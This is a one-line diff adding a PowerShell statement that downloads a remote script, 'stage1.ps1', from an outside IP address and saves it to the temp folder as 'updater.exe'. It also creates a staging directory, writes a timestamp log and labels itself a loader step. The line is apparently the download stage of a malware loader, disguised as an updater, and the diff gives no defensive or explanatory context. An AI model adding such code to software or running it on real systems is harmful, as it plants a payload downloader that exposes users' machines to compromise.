@@ -1,0 +1,1 @@
+try { $PayloadUrl = "https://203.0.113.193/stage1.ps1"; $WorkingPath = "$env:TEMP\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $WorkingPath); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Loader step failed" }
